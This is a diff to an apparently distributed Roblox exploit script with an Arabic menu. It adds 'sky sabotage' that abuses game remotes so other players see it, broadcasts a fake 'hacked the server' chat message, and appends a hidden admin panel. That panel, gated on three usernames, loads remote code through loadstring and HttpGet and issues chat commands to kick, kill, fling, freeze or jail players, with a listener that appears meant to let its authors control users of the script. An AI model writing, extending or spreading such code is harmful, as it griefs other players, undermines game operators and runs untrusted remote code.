@@ -4495,11 +4495,7 @@ FunTab:AddToggle({
     end
 })
 
-
-local Tab20 = Window:MakeTab({
-Title = " تخريب السماء (تحت التطوير) ",
-Icon = "rbxassetid://114769879906735"
-})
+local Tab20 = Window:MakeTab({Name = "تخريب السماء (تم اضافه اشياء تضهر للكل) ", Icon = "rbxassetid://6031071050"})
 
 Tab20:AddButton({
 Name = "تخريب سماء Skiliton نادر",
@@ -4512,82 +4508,207 @@ local imageFive = "http://www.roblox.com/asset/?id=169585515"
 local imageSix = "http://www.roblox.com/asset/?id=169585502"
 local imageSeven = "http://www.roblox.com/asset/?id=169585485"
 local imageEight = "http://www.roblox.com/asset/?id=169585475"
-
-local Spooky = Instance.new("Sound", workspace)  
-    Spooky.Name = "Spooky"  
-    Spooky.SoundId = "rbxassetid://174270407"  
-    Spooky.Volume = 15  
-    Spooky.Looped = true  
-    Spooky:Play()  
-
-    local Sky = Instance.new("Sky", game.Lighting)  
-    Sky.SkyboxBk = imageOne  
-    Sky.SkyboxDn = imageOne  
-    Sky.SkyboxFt = imageOne  
-    Sky.SkyboxLf = imageOne  
-    Sky.SkyboxRt = imageOne  
-    Sky.SkyboxUp = imageOne  
-
-    while true do  
-        Sky.SkyboxBk = imageOne  
-        Sky.SkyboxDn = imageOne  
-        Sky.SkyboxFt = imageOne  
-        Sky.SkyboxLf = imageOne  
-        Sky.SkyboxRt = imageOne  
-        Sky.SkyboxUp = imageOne  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageTwo  
-        Sky.SkyboxDn = imageTwo  
-        Sky.SkyboxFt = imageTwo  
-        Sky.SkyboxLf = imageTwo  
-        Sky.SkyboxRt = imageTwo  
-        Sky.SkyboxUp = imageTwo  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageThree  
-        Sky.SkyboxDn = imageThree  
-        Sky.SkyboxFt = imageThree  
-        Sky.SkyboxLf = imageThree  
-        Sky.SkyboxRt = imageThree  
-        Sky.SkyboxUp = imageThree  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageFour  
-        Sky.SkyboxDn = imageFour  
-        Sky.SkyboxFt = imageFour  
-        Sky.SkyboxLf = imageFour  
-        Sky.SkyboxRt = imageFour  
-        Sky.SkyboxUp = imageFour  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageFive  
-        Sky.SkyboxDn = imageFive  
-        Sky.SkyboxFt = imageFive  
-        Sky.SkyboxLf = imageFive  
-        Sky.SkyboxRt = imageFive  
-        Sky.SkyboxUp = imageFive  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageSix  
-        Sky.SkyboxDn = imageSix  
-        Sky.SkyboxFt = imageSix  
-        Sky.SkyboxLf = imageSix  
-        Sky.SkyboxRt = imageSix  
-        Sky.SkyboxUp = imageSix  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageSeven  
-        Sky.SkyboxDn = imageSeven  
-        Sky.SkyboxFt = imageSeven  
-        Sky.SkyboxLf = imageSeven  
-        Sky.SkyboxRt = imageSeven  
-        Sky.SkyboxUp = imageSeven  
-        task.wait(0.15)  
-        Sky.SkyboxBk = imageEight  
-        Sky.SkyboxDn = imageEight  
-        Sky.SkyboxFt = imageEight  
-        Sky.SkyboxLf = imageEight  
-        Sky.SkyboxRt = imageEight  
-        Sky.SkyboxUp = imageEight  
-        task.wait(0.15)  
-    end  
+local Spooky = Instance.new("Sound", workspace)
+Spooky.Name = "Spooky"
+Spooky.SoundId = "rbxassetid://174270407"
+Spooky.Volume = 15
+Spooky.Looped = true
+Spooky:Play()
+local Sky = Instance.new("Sky", game.Lighting)
+Sky.SkyboxBk = imageOne
+Sky.SkyboxDn = imageOne
+Sky.SkyboxFt = imageOne
+Sky.SkyboxLf = imageOne
+Sky.SkyboxRt = imageOne
+Sky.SkyboxUp = imageOne
+while true do
+Sky.SkyboxBk = imageOne
+Sky.SkyboxDn = imageOne
+Sky.SkyboxFt = imageOne
+Sky.SkyboxLf = imageOne
+Sky.SkyboxRt = imageOne
+Sky.SkyboxUp = imageOne
+task.wait(0.15)
+Sky.SkyboxBk = imageTwo
+Sky.SkyboxDn = imageTwo
+Sky.SkyboxFt = imageTwo
+Sky.SkyboxLf = imageTwo
+Sky.SkyboxRt = imageTwo
+Sky.SkyboxUp = imageTwo
+task.wait(0.15)
+Sky.SkyboxBk = imageThree
+Sky.SkyboxDn = imageThree
+Sky.SkyboxFt = imageThree
+Sky.SkyboxLf = imageThree
+Sky.SkyboxRt = imageThree
+Sky.SkyboxUp = imageThree
+task.wait(0.15)
+Sky.SkyboxBk = imageFour
+Sky.SkyboxDn = imageFour
+Sky.SkyboxFt = imageFour
+Sky.SkyboxLf = imageFour
+Sky.SkyboxRt = imageFour
+Sky.SkyboxUp = imageFour
+task.wait(0.15)
+Sky.SkyboxBk = imageFive
+Sky.SkyboxDn = imageFive
+Sky.SkyboxFt = imageFive
+Sky.SkyboxLf = imageFive
+Sky.SkyboxRt = imageFive
+Sky.SkyboxUp = imageFive
+task.wait(0.15)
+Sky.SkyboxBk = imageSix
+Sky.SkyboxDn = imageSix
+Sky.SkyboxFt = imageSix
+Sky.SkyboxLf = imageSix
+Sky.SkyboxRt = imageSix
+Sky.SkyboxUp = imageSix
+task.wait(0.15)
+Sky.SkyboxBk = imageSeven
+Sky.SkyboxDn = imageSeven
+Sky.SkyboxFt = imageSeven
+Sky.SkyboxLf = imageSeven
+Sky.SkyboxRt = imageSeven
+Sky.SkyboxUp = imageSeven
+task.wait(0.15)
+Sky.SkyboxBk = imageEight
+Sky.SkyboxDn = imageEight
+Sky.SkyboxFt = imageEight
+Sky.SkyboxLf = imageEight
+Sky.SkyboxRt = imageEight
+Sky.SkyboxUp = imageEight
+task.wait(0.15)
 end
+end
+})
 
+local Section = Tab20:AddSection({"تخريب الجو يظهر للكل"})
+local selectedColor = nil
+local dropdown = Tab20:AddDropdown({
+Name = "اختار لون التخريب",
+Options = {"أحمر", "بطه", "أبيض"},
+Default = "أحمر",
+Callback = function(Value)
+selectedColor = Value
+end
+})
+
+Tab20:AddButton({
+Name = "ابدأ",
+Description = "إذا تريد توقفه سوي رست",
+Callback = function()
+local chatService = game:GetService("TextChatService")
+if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
+local channel = chatService.TextChannels:FindFirstChild("RBXGeneral")
+if channel then
+channel:SendAsync("server:(STR Wath hacked the server) ")
+end
+end
+if selectedColor == "أحمر" then
+local args = {5831429758}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearShirt"):InvokeServer(unpack(args))
+elseif selectedColor == "بطه" then
+local args = {5438523557}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearShirt"):InvokeServer(unpack(args))
+elseif selectedColor == "أبيض" then
+local args = {7402745350}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearShirt"):InvokeServer(unpack(args))
+end
+task.wait(1)
+local args2 = {{100839513065432}}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(args2))
+local function missing(t, f, fallback)
+if type(f) == t then return f end
+return fallback 
+end
+cloneref = missing("function", cloneref, function(...) return ... end)
+local Services = setmetatable({}, {
+__index = function(_, name)
+return cloneref(game:GetService(name))
+end
+})
+local Players = Services.Players
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+player.CharacterAdded:Connect(function(newCharacter)
+character = newCharacter
+humanoid = character:WaitForChild("Humanoid")
+end)
+local Settings = {
+["Fade In"] = 0.1,
+["Fade Out"] = 0.1,
+["Weight"] = 1,
+["Speed"] = 1,
+["Time Position"] = 0
+}
+local CurrentTrack
+local function LoadTrack(id)
+if CurrentTrack then 
+CurrentTrack:Stop(0) 
+end
+local animId
+local ok, result = pcall(function()
+return game:GetObjects("rbxassetid://" .. tostring(id))
+end)
+if ok and result and #result > 0 then
+local anim = result[1]
+if anim:IsA("Animation") then
+animId = anim.AnimationId
+else
+animId = "rbxassetid://" .. tostring(id)
+end
+else
+animId = "rbxassetid://" .. tostring(id)
+end
+local newAnim = Instance.new("Animation")
+newAnim.AnimationId = animId
+local newTrack = humanoid:LoadAnimation(newAnim)
+newTrack.Priority = Enum.AnimationPriority.Action4
+local weight = Settings["Weight"]
+if weight == 0 then weight = 0.001 end
+newTrack:Play(Settings["Fade In"], weight, Settings["Speed"])
+CurrentTrack = newTrack
+CurrentTrack.TimePosition = math.clamp(Settings["Time Position"], 0, 1) * CurrentTrack.Length
+return newTrack
+end
+local EmoteId = 101852027997337
+LoadTrack(EmoteId)
+end
+})
+
+local Section2 = Tab20:AddSection({"خلي ال SkyBox يلف"})
+local spinning = false
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+player.CharacterAdded:Connect(function(c)
+character = c
+hrp = c:WaitForChild("HumanoidRootPart")
+end)
+Tab20:AddToggle({
+Name = "لف ال skybox",
+Default = false,
+Callback = function(Value)
+spinning = Value
+if Value then
+local chatService = game:GetService("TextChatService")
+if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
+local channel = chatService.TextChannels:FindFirstChild("RBXGeneral")
+if channel then
+channel:SendAsync("STR: sky box Turning ")
+end
+end
+task.spawn(function()
+while spinning and hrp and hrp.Parent do
+hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
+task.wait(0.05)
+end
+end)
+end
+end
 })
 
 local bombTab = Window:MakeTab({
@@ -4879,3 +5000,321 @@ Notify({
     Duration = 5
 })
 
+local allowedAdmins = {
+    ["jakakqowqpq"] = true,
+    ["youssef126608"] = true,
+    ["SUKUNA_333857"] = true
+}
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = workspace
+local LocalPlayer = Players.LocalPlayer
+
+if not allowedAdmins[LocalPlayer.Name] then return end
+
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+local Window = WindUI:CreateWindow({
+    Title =  "👾STR  - Admins/Developers👾 ",
+    Icon = "shield",
+    Author = "by Shadow · v1.1.6",
+    Size = UDim2.fromOffset(600, 480),
+    Transparent = true,
+    Theme = "Dark",
+    ThemeColor = Color3.fromRGB(160, 0, 255),
+    Resizable = true,
+})
+
+Window:Tag({
+    Title = "v" .. WindUI.Version,
+    Icon = "shield",
+    Color = Color3.fromRGB(160, 0, 255)
+})
+
+local AdminTab = Window:Tab({
+    Title = "Admin",
+    Icon = "shield",
+    Locked = false
+})
+
+local Section = AdminTab:Section({
+    Title = "Admin Commands",
+    Icon = "user-cog",
+    Opened = true
+})
+
+local function getPlayersList()
+    local t = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        table.insert(t, p.Name)
+    end
+    return t
+end
+
+local SelectedPlayer = LocalPlayer.Name
+local Dropdown = Section:Dropdown({
+    Title = "Select Player",
+    Values = getPlayersList(),
+    Value = LocalPlayer.Name,
+    Callback = function(val)
+        SelectedPlayer = val
+    end
+})
+
+Players.PlayerAdded:Connect(function()
+    Dropdown:SetValues(getPlayersList())
+end)
+Players.PlayerRemoving:Connect(function()
+    Dropdown:SetValues(getPlayersList())
+end)
+
+local function sendChatCommand(cmd)
+    local channel = TextChatService.TextChannels and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel and type(channel.SendAsync) == "function" then
+        channel:SendAsync(cmd)
+    end
+end
+
+local commands = {
+    {name = "Kick", command = ";kick"},
+    {name = "Kill", command = ";kill"},
+    {name = "Kill+", command = ";killplus"},
+    {name = "Fling", command = ";fling"},
+    {name = "Freeze", command = ";freeze"},
+    {name = "Jail", command = ";jail"},
+    {name = "Unjail", command = ";unjail"},
+    {name = "KillWithBus", command = ";killwithbus"},
+    {name = "Verifique", command = ";verifique"}
+}
+
+for _, c in ipairs(commands) do
+    Section:Button({
+        Title = c.name,
+        Desc = "Execute " .. c.command .. " on selected player",
+        Callback = function()
+            if c.command == ";verifique" then
+                sendChatCommand(c.command)
+            else
+                if SelectedPlayer and SelectedPlayer ~= "" then
+                    sendChatCommand(c.command .. " " .. SelectedPlayer)
+                end
+            end
+        end
+    })
+end
+
+TextChatService.OnIncomingMessage = function(message)
+    if not message or not message.TextSource or not message.Text then return end
+    if not allowedAdmins[message.TextSource.Name] then return end
+
+    local msgText = tostring(message.Text):lower()
+    local playerName = LocalPlayer.Name:lower()
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+    if msgText:match(";kick%s+" .. playerName) then
+        LocalPlayer:Kick("Kicked by SABNOX Admin panel.")
+    elseif msgText:match(";kill%s+" .. playerName) then
+        if character then character:BreakJoints() end
+    elseif msgText:match(";killplus%s+" .. playerName) then
+        if character then
+            character:BreakJoints()
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                for i = 1, 10 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(10,10,10)
+                    part.Anchored = false
+                    part.CanCollide = false
+                    part.Material = Enum.Material.Neon
+                    part.BrickColor = BrickColor.Random()
+                    part.CFrame = root.CFrame
+                    part.Parent = workspace
+                    local bv = Instance.new("BodyVelocity")
+                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                    bv.Parent = part
+                    game:GetService("Debris"):AddItem(part, 3)
+                end
+            end
+        end
+    elseif msgText:match(";fling%s+" .. playerName) then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local targetCFrame = CFrame.new(50000, 5000000, 3972823)
+                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
+                local okTween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
+                okTween:Play()
+            end
+        end
+    elseif msgText:match(";freeze%s+" .. playerName) then
+        if humanoid then humanoid.WalkSpeed = 0 end
+    elseif msgText:match(";jail%s+" .. playerName) then
+        local char = character or LocalPlayer.CharacterAdded:Wait()
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hrp and hum then
+            local JailSize = Vector3.new(10, 8, 10)
+            local WallThickness = 1
+            local Material = Enum.Material.Ice
+            local Color = Color3.fromRGB(80, 180, 255)
+            local Transparency = 0.5
+
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+            hum.PlatformStand = true
+
+            local oldJail = workspace:FindFirstChild("BlueIceJail")
+            if oldJail then oldJail:Destroy() end
+
+            local jail = Instance.new("Model", workspace)
+            jail.Name = "BlueIceJail"
+
+            local function makePart(size, cf)
+                local p = Instance.new("Part")
+                p.Anchored = true
+                p.CanCollide = true
+                p.Material = Material
+                p.Color = Color
+                p.Transparency = Transparency
+                p.Size = size
+                p.CFrame = cf
+                p.Parent = jail
+                return p
+            end
+
+            local pos = hrp.Position
+            local half = JailSize / 2
+
+            makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos - Vector3.new(0, half.Y, 0)))
+            makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos + Vector3.new(0, half.Y, 0)))
+            makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos + Vector3.new(half.X, 0, 0)))
+            makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos - Vector3.new(half.X, 0, 0)))
+            makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos + Vector3.new(0, 0, half.Z)))
+            makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos - Vector3.new(0, 0, half.Z)))
+
+            if _G.jailConn then _G.jailConn:Disconnect() end
+            _G.jailConn = game:GetService("RunService").RenderStepped:Connect(function()
+                if hrp and hrp.Parent then
+                    hrp.CFrame = CFrame.new(pos + Vector3.new(0, 2, 0))
+                end
+            end)
+        end
+    elseif msgText:match(";unjail%s+" .. playerName) then
+        local char = character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+            hum.PlatformStand = false
+        end
+        local jail = workspace:FindFirstChild("BlueIceJail")
+        if jail then jail:Destroy() end
+        if _G.jailConn then _G.jailConn:Disconnect() _G.jailConn = nil end
+    elseif msgText:match(";verifique") then
+        local channels = TextChatService:FindFirstChild("TextChannels")
+        local channel = channels and channels:FindFirstChild("RBXGeneral")
+        if channel and type(channel.SendAsync) == "function" then
+            local randomNumber = math.random(1000, 9999)
+            local verificationMessage = "Shadow is back" .. randomNumber
+            channel:SendAsync(verificationMessage)
+        end
+    elseif msgText:match(";killwithbus%s+" .. playerName) then
+        local player = LocalPlayer
+        local char = player.Character or player.CharacterAdded:Wait()
+        local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+        local function GetBus()
+            local vehicles = workspace:FindFirstChild("Vehicles")
+            if vehicles then
+                return vehicles:FindFirstChild(player.Name .. "Car")
+            end
+            return nil
+        end
+        local bus = GetBus()
+        if not bus then
+            humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
+            task.wait(0.5)
+            local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
+            if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
+                remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
+            end
+            task.wait(1)
+            bus = GetBus()
+        end
+        if bus then
+            local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
+            if seat and char:FindFirstChildOfClass("Humanoid") and not char.Humanoid.Sit then
+                repeat
+                    humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
+                    task.wait()
+                until char.Humanoid.Sit or not bus.Parent
+            end
+        end
+        local function TrackPlayer()
+            local voidPosition = Vector3.new(0, -500, 0)
+            local targetPlayer = Players:FindFirstChild(playerName)
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if targetHumanoid and targetHumanoid.Sit then
+                    if bus and bus:IsDescendantOf(workspace) then
+                        if bus.PrimaryPart then
+                            bus:SetPrimaryPartCFrame(CFrame.new(voidPosition))
+                        else
+                            local primary = bus:FindFirstChildWhichIsA("BasePart") or bus:FindFirstChild("Body") or bus:FindFirstChild("Chassis")
+                            if primary then
+                                primary.CFrame = CFrame.new(voidPosition)
+                            end
+                        end
+                        task.wait(0.2)
+                        bus:Destroy()
+                    end
+                    return true
+                end
+            end
+            return false
+        end
+        local watchdog = 0
+        while watchdog < 60 do
+            local ok, done = pcall(TrackPlayer)
+            if ok and done then break end
+            task.wait(0.5)
+            watchdog = watchdog + 0.5
+            if not (bus and bus.Parent) then
+                bus = GetBus()
+            end
+        end
+    end
+end
+
+local frameIds = {
+    126236556586764,
+    136412915020251,
+    118280109681409,
+    101381777744900,
+    102672201310426,
+    124200335226270,
+    89407138360978,
+    111538665898847,
+    109147998960875,
+    96634424934105,
+    121058843996793,
+    124085269518949,
+    80121979897261,
+    105390718040660,
+    81239864778767,
+    93607458795390,
+    129395887027556,
+    96412008726713,
+    131052168057364
+}
+
+return {
+    frameIds = frameIds
+}
+-- sabnox Admin
+-- by Shadow
+-- Update 1.9
